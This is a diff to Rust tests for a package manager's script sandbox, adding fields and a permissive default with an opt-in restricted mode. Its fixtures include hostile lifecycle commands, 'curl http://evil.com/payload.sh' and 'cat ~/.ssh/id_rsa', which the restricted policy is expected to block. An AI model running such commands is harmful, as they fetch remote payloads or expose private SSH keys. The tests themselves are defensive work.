@@ -85,6 +85,7 @@ async fn test_optional_lifecycle_script_failure_isolation() {
         init_cwd: temp.path().to_path_buf(),
         ignore_scripts: false,
         capture_output: true,
+        foreground_scripts: false,
         timeout: None,
         sandbox_policy: ScriptSandboxPolicy::default(),
     };
@@ -172,6 +173,8 @@ async fn test_execute_workspace_scripts_topological() {
         script: "build".to_string(),
         args: vec![],
         ignore_scripts: false,
+        foreground_scripts: false,
+        strict_sandbox: false,
         if_present: false,
         filter_members: None,
     };
@@ -277,6 +280,7 @@ async fn test_topological_dependency_cycle_prevention() {
         init_cwd: root.clone(),
         ignore_scripts: false,
         capture_output: true,
+        foreground_scripts: false,
         timeout: None,
         sandbox_policy: ScriptSandboxPolicy::default(),
     };
@@ -318,6 +322,7 @@ async fn test_optional_dependency_disk_removal_on_failure() {
         init_cwd: root.clone(),
         ignore_scripts: false,
         capture_output: true,
+        foreground_scripts: false,
         timeout: None,
         sandbox_policy: ScriptSandboxPolicy::default(),
     };
@@ -494,6 +499,8 @@ async fn test_workspace_execution_aborts_and_halts_remaining_packages() {
         script: "build".to_string(),
         args: vec![],
         ignore_scripts: false,
+        foreground_scripts: false,
+        strict_sandbox: false,
         if_present: false,
         filter_members: None,
     };
@@ -711,6 +718,8 @@ async fn test_monorepo_topological_sort_stress_large_dag() {
         script: "stress-build".to_string(),
         args: vec![],
         ignore_scripts: false,
+        foreground_scripts: false,
+        strict_sandbox: false,
         if_present: false,
         filter_members: None,
     };
@@ -794,6 +803,7 @@ async fn test_lifecycle_topological_stress_50_plus_packages() {
         init_cwd: root.clone(),
         ignore_scripts: false,
         capture_output: true,
+        foreground_scripts: false,
         timeout: None,
         sandbox_policy: ScriptSandboxPolicy::default(),
     };
@@ -930,6 +940,8 @@ async fn test_execute_workspace_scripts_with_filter_and_scope() {
         script: "build".to_string(),
         args: vec![],
         ignore_scripts: false,
+        foreground_scripts: false,
+        strict_sandbox: false,
         if_present: false,
         filter_members: Some(vec!["@scope/*".to_string()]),
     };
@@ -949,6 +961,8 @@ async fn test_execute_workspace_scripts_with_filter_and_scope() {
         script: "build".to_string(),
         args: vec![],
         ignore_scripts: false,
+        foreground_scripts: false,
+        strict_sandbox: false,
         if_present: false,
         filter_members: Some(vec!["nonexistent-*".to_string()]),
     };
@@ -1593,11 +1607,11 @@ fn test_sandbox_execution_cancellation_sync() {
         "malicious-curl-pkg",
         "postinstall",
         "curl http://evil.com/payload.sh",
-    );
+    ).with_sandbox_policy(ScriptSandboxPolicy::restricted());
 
-    // Must immediately fail and cancel execution before spawning process
+    // In restricted sandbox, must fail and cancel execution before spawning process
     let res = execute_lifecycle_script(&ctx);
-    assert!(res.is_err(), "Dangerous script must fail synchronously before spawn");
+    assert!(res.is_err(), "Dangerous script must fail synchronously before spawn in restricted sandbox");
     let err_str = res.unwrap_err().to_string();
     assert!(err_str.contains("Dangerous command pattern detected"));
     assert!(err_str.contains("curl"));
@@ -1614,14 +1628,57 @@ async fn test_sandbox_execution_cancellation_async() {
         "malicious-ssh-pkg",
         "preinstall",
         "cat ~/.ssh/id_rsa",
-    );
+    ).with_sandbox_policy(ScriptSandboxPolicy::restricted());
 
-    // Must immediately fail and cancel async execution
+    // In restricted sandbox, must fail and cancel async execution
     let res = execute_lifecycle_script_async(&ctx).await;
-    assert!(res.is_err(), "Dangerous script must fail asynchronously before spawn");
+    assert!(res.is_err(), "Dangerous script must fail asynchronously before spawn in restricted sandbox");
     let err_str = res.unwrap_err().to_string();
     assert!(err_str.contains("Dangerous command pattern detected"));
     assert!(err_str.contains("~/.ssh"));
+}
+
+#[test]
+fn test_default_policy_permissive_npm_parity_allows_native_builds() {
+    let default_policy = ScriptSandboxPolicy::default();
+    assert_eq!(default_policy.level, SandboxLevel::Permissive);
+    assert!(default_policy.level.is_permissive());
+
+    // Standard native build tool invocations must all be allowed by default
+    let native_commands = [
+        "node-gyp rebuild",
+        "python binding.py",
+        "python3 configure.py",
+        "make -C build",
+        "cl.exe /c addon.cc",
+        "cmake --build .",
+        "cmake-js compile",
+        "ninja -C out/Release",
+        "msbuild Addon.sln",
+        "node -e \"console.log('build ready')\"",
+    ];
+
+    for cmd in native_commands {
+        assert!(
+            default_policy.check_execution_allowed("native-addon-pkg", cmd).is_ok(),
+            "Default permissive policy should allow native build command: '{cmd}'"
+        );
+    }
+}
+
+#[test]
+fn test_opt_in_strict_sandbox_policy_enforcement() {
+    let strict_policy = ScriptSandboxPolicy::restricted();
+    assert_eq!(strict_policy.level, SandboxLevel::Restricted);
+    assert!(strict_policy.level.is_restricted());
+
+    // Standard native builds without dangerous patterns are still permitted
+    assert!(strict_policy.check_execution_allowed("native-pkg", "node-gyp rebuild").is_ok());
+    assert!(strict_policy.check_execution_allowed("native-pkg", "cmake --build .").is_ok());
+
+    // But dangerous network / sensitive patterns are blocked in restricted mode
+    assert!(strict_policy.check_execution_allowed("bad-pkg", "curl http://evil.com").is_err());
+    assert!(strict_policy.check_execution_allowed("bad-pkg", "cat ~/.ssh/id_rsa").is_err());
 }
 
 #[test]
@@ -1696,6 +1753,8 @@ async fn test_workspace_script_hook_sequencing_pre_main_post() {
         script: "build".to_string(),
         args: vec![],
         ignore_scripts: false,
+        foreground_scripts: false,
+        strict_sandbox: false,
         if_present: false,
         filter_members: None,
     };
@@ -1772,6 +1831,8 @@ async fn test_workspace_script_pre_hook_failure_halts_execution() {
         script: "test".to_string(),
         args: vec![],
         ignore_scripts: false,
+        foreground_scripts: false,
+        strict_sandbox: false,
         if_present: false,
         filter_members: None,
     };
@@ -1820,6 +1881,8 @@ async fn test_workspace_script_main_failure_prevents_post_hook() {
         script: "build".to_string(),
         args: vec![],
         ignore_scripts: false,
+        foreground_scripts: false,
+        strict_sandbox: false,
         if_present: false,
         filter_members: None,
     };
@@ -1915,6 +1978,8 @@ async fn test_workspace_script_missing_hooks_safely_skipped() {
         script: "compile".to_string(),
         args: vec![],
         ignore_scripts: false,
+        foreground_scripts: false,
+        strict_sandbox: false,
         if_present: true,
         filter_members: None,
     };
@@ -2013,6 +2078,8 @@ async fn test_workspace_topological_order_execution_dependencies_before_dependen
         script: "build".to_string(),
         args: vec![],
         ignore_scripts: false,
+        foreground_scripts: false,
+        strict_sandbox: false,
         if_present: false,
         filter_members: None,
     };
